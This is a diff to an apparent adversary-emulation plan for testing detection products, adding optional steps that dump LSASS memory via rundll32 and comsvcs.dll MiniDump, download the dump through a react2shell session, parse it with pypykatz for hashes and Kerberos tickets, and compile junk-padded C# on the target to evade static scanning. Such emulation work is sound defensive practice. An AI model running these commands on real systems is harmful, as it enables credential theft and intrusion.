@@ -259,6 +259,197 @@ for the attacker to capture and reassemble into the original dump.
 
 ---
 
+> **Optional Step** — Alternative LSASS acquisition via `rundll32.exe` + `comsvcs.dll MiniDump`. Execute in addition to or instead of Step 1 to exercise a distinct detection rule family. This method is more widely detected than the `RtlCreateProcessReflection` approach and is flagged by most EDR products — proceed only if testing the `comsvcs.dll MiniDump` detection chain is an explicit objective for this run.
+
+## Step 1.5 — Alternative Credential Access: LSASS Dump via Rundll32 + comsvcs.dll (Optional)
+
+### Voice Track
+
+As an alternative or supplementary LSASS acquisition technique, the attacker invokes
+`rundll32.exe` to proxy execution of the `MiniDump` function exported from
+`comsvcs.dll` — the most widely deployed LSASS dump method across CaaS ransomware
+families including Conti, BlackBasta, and BlackSuit. Unlike the
+`RtlCreateProcessReflection`-based Step 1, which forks LSASS into a clone before
+dumping the fork, this approach opens a direct `PROCESS_ALL_ACCESS` handle to the
+live `lsass.exe` process and passes it to `comsvcs.dll`'s `MiniDumpWriteDump`
+implementation via the `MiniDump` export.
+
+The resulting dump is a standard Windows minidump with intact MDMP magic bytes —
+more visible to static scanners than the XOR-encrypted `f.elif` of Step 1, but
+useful for testing whether the product detects the LSASS handle-open event before
+the file write occurs. The two steps produce independent detection chain signals:
+`RtlCreateProcessReflection` vs `PROCESS_ALL_ACCESS` handle to `lsass.exe`, and
+`f.elif` (no MDMP header) vs `g.dmp` (valid minidump). Running both in the same
+session exercises two separate rule families.
+
+### Procedures
+
+- Obtain the LSASS PID from the SYSTEM dnscat2 shell
+
+  ```text
+  C:\Windows\Temp> powershell -NoProfile -Command "(Get-Process lsass).Id"
+  ```
+
+  - ***Expected Output***
+
+    ```text
+    <lsass_pid>
+    ```
+
+- ☣️ Invoke `rundll32.exe` to dump LSASS memory via `comsvcs.dll MiniDump`
+
+  ```text
+  C:\Windows\Temp> rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\Windows\Temp\g.dmp full
+  ```
+
+  - ***Expected Output***
+
+    ```text
+    (no console output — rundll32.exe returns silently on success)
+    ```
+
+- Verify the dump file was created
+
+  ```text
+  C:\Windows\Temp> dir g.dmp
+  ```
+
+  - ***Expected Output***
+
+    ```text
+     Directory of C:\Windows\Temp
+
+    <date>  <time>    <size> g.dmp
+                   1 File(s)    <size> bytes
+    ```
+
+    File size will be in the tens to hundreds of MB depending on LSASS working set.
+
+- ☣️ Download the dump file via react2shell for offline parsing
+
+  ```
+  rce > download C:\Windows\Temp\g.dmp
+  ```
+
+  - ***Expected Output***
+
+    ```text
+    [*] Downloading C:\Windows\Temp\g.dmp (XXXXXXX bytes) in XXXX chunk(s) via eval (NO spawn - STEALTH!)...
+    ...
+    [+] File saved to: downloaded_g.dmp (XXXXXXX bytes, NO process spawn!)
+    ```
+
+- ☣️ Parse credentials offline
+
+  ```bash
+  pypykatz lsa minidump downloaded_g.dmp
+  ```
+
+  - ***Expected Output***
+
+    ```text
+    [+] NT hashes / Kerberos tickets / plaintext credentials for domain accounts cached on the IIS server
+    ```
+
+### Reference Tables
+
+| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
+| - | - | - | - | - | - | - | - | - | - | - |
+| Defense Evasion | T1218.011 | System Binary Proxy Execution: Rundll32 | Windows | Sysmon Event 1 on IIS01: `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\Windows\Temp\g.dmp full` spawned from `RuntimeBroker.exe` ghost (NT AUTHORITY\SYSTEM); Sysmon Event 10: `rundll32.exe` opens handle to `lsass.exe` with `PROCESS_ALL_ACCESS` | Calibrated - Not Benign | `rundll32.exe` proxies `comsvcs.dll`'s `MiniDump` export to write a full LSASS minidump to `C:\Windows\Temp\g.dmp` — alternative to the `RtlCreateProcessReflection`-based Step 1; tests the `comsvcs.dll MiniDump` detection chain used by Conti, BlackBasta, and BlackSuit | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
+| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Windows | Sysmon Event 11 on IIS01: `rundll32.exe` creates `C:\Windows\Temp\g.dmp` containing MDMP magic bytes; Sysmon Event 10: `PROCESS_ALL_ACCESS` handle opened to `lsass.exe` by `rundll32.exe` (child of `RuntimeBroker.exe` ghost, NT AUTHORITY\SYSTEM) | Calibrated - Not Benign | `comsvcs.dll MiniDump` dumps full LSASS working set to `g.dmp` via `rundll32.exe` — distinct from Step 1's XOR-encrypted `f.elif`; dump contains plaintext credentials, NTLM hashes, and Kerberos tickets for domain accounts cached on IIS01 | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
+
+---
+
+> **Optional Step** — Compile-after-delivery alternative for AV discovery. Delivers `WmiQuery.cs` (C# source with dead code insertions for T1027.016) to IIS01 via react2shell, then compiles on the target host using `csc.exe` (T1027.004). The compiled binary performs WMI-based AV enumeration — same objective as `WmiAvQuery.exe` in Step 2 but via on-target compilation. Execute in addition to the WmiAvQuery.exe step, not in place of it. Note: `ROOT\SecurityCenter2` is unavailable on Windows Server 2022 — the query will return an error (expected). Run to exercise the T1027.004 detection chain, not for functional AV output.
+
+## Step 1.7 — Defense Evasion: Compile-After-Delivery with Junk Code Insertion (Optional, T1027.004 + T1027.016)
+
+### Voice Track
+
+As an optional evasion demonstration, the attacker delivers a C# source file (`WmiQuery.cs`) to the IIS server via react2shell rather than a pre-compiled PE binary. The source file intentionally contains dead code insertions — an unused constant (`kPad`), a never-called method (`Stub`), and a discarded computation (`kPad >> 1`) — to increase per-sample entropy and complicate static analysis of the staged artifact prior to compilation (T1027.016). Because the file at rest is plaintext C# source rather than a PE, byte-level signature detection cannot match against it during upload.
+
+On the target host, the attacker invokes the .NET Framework `csc.exe` compiler from the SYSTEM dnscat2 shell to compile the source into a PE executable. The compiler binary (`csc.exe`) is a native Windows component present in all .NET Framework 4.x installations, requiring no external tooling. This compile-after-delivery pattern avoids staging a pre-built binary entirely — a source file exhibits no PE structure, no import table, and no suspicious entropy profile on disk. The resulting binary performs WMI-based security software discovery, querying `ROOT\SecurityCenter2` via `ManagementObjectSearcher`.
+
+### Setup
+
+- Ensure `WmiQuery.cs` is present in the `resources/payloads/WmiAvQuery/` directory:
+
+  ```
+  resources\payloads\WmiAvQuery\WmiQuery.cs
+  ```
+
+- ☣️ Base64-encode `WmiQuery.cs` for react2shell upload (from the attacker machine)
+
+  ```bash
+  cd resources/payloads/react2shell-tool
+  python -c "import base64; open('WmiQuery.b64','wb').write(base64.b64encode(open('../WmiAvQuery/WmiQuery.cs','rb').read()))"
+  ```
+
+  - ***Expected Output***
+
+    ```text
+    (no output — WmiQuery.b64 created in resources/payloads/react2shell-tool/)
+    ```
+
+### Procedures
+
+- ☣️ Upload and decode `WmiQuery.cs` to the IIS server via the react2shell session
+
+  ```
+  rce > upload WmiQuery.b64 C:\Windows\Temp\WmiQuery.b64
+  rce > decode C:\Windows\Temp\WmiQuery.b64 C:\Windows\Temp\WmiQuery.cs
+  ```
+
+  - ***Expected Output***
+
+    ```text
+    [*] Uploading WmiQuery.b64 via eval (NO spawn - STEALTH!)...
+    [+] File uploaded successfully -> C:\Windows\Temp\WmiQuery.b64 (NO process spawn!)
+    [+] File decoded successfully -> C:\Windows\Temp\WmiQuery.cs (NO process spawn!)
+    ```
+
+- ☣️ From the elevated dnscat2 C2 session (SYSTEM), compile `WmiQuery.cs` on the target host
+
+  ```text
+  C:\Windows\Temp> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\WmiQuery.exe C:\Windows\Temp\WmiQuery.cs /r:C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Management.dll
+  ```
+
+  - ***Expected Output***
+
+    ```text
+    Microsoft (R) Visual C# Compiler version 4.x.xxxxx.x
+    Copyright (C) Microsoft Corporation. All rights reserved.
+    ```
+
+    One or two "unused variable" or "unused method" warnings may appear — these do not prevent successful compilation.
+
+- ☣️ Execute the compiled binary
+
+  ```text
+  C:\Windows\Temp> WmiQuery.exe
+  ```
+
+  - ***Expected Output (Windows Server — ROOT\SecurityCenter2 unavailable)***
+
+    ```text
+    [!] Invalid namespace
+    ```
+
+    The error is expected on Windows Server 2022. To confirm `csc.exe` compiled the binary successfully:
+
+    ```text
+    C:\Windows\Temp> dir WmiQuery.exe
+    ```
+
+### Reference Tables
+
+| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
+| - | - | - | - | - | - | - | - | - | - | - |
+| Defense Evasion | T1027.004 | Obfuscated Files or Information: Compile After Delivery | Windows | `RuntimeBroker.exe` (ghost process, NT AUTHORITY\SYSTEM) spawns `cmd.exe` which executes `csc.exe /out:C:\Windows\Temp\WmiQuery.exe C:\Windows\Temp\WmiQuery.cs /r:...System.Management.dll` on IIS01 (Sysmon Event 1) | Calibrated - Not Benign | `csc.exe` compiles `WmiQuery.cs` — delivered as plaintext source to IIS01 — into a PE executable on the target host; source delivery avoids static PE signature matching during ingress; compilation occurs entirely on the target using the built-in .NET Framework compiler | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [WmiQuery.cs](../../resources/payloads/WmiAvQuery/WmiQuery.cs) | - |
+| Defense Evasion | T1027.016 | Obfuscated Files or Information: Junk Code Insertion | Windows | Dead code in `WmiQuery.cs`: unreachable `Stub()` method and discarded `kPad >> 1` computation are syntactically valid C# but produce no runtime effect — not independently distinguishable from functional code via standard EDR telemetry | Not Calibrated - Not Benign | `WmiQuery.cs` contains dead code insertions — unused constant `kPad`, never-called `Stub()` method, and discarded `unused` variable — to increase per-sample entropy and complicate static analysis of the source file; dead code is indistinguishable from live logic in pre-compilation source without semantic analysis | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [WmiQuery.cs](../../resources/payloads/WmiAvQuery/WmiQuery.cs) | - |
+
+---
+
 ## Step 2 - Discovery: Host & Domain Reconnaissance
 
 ### Voice Track
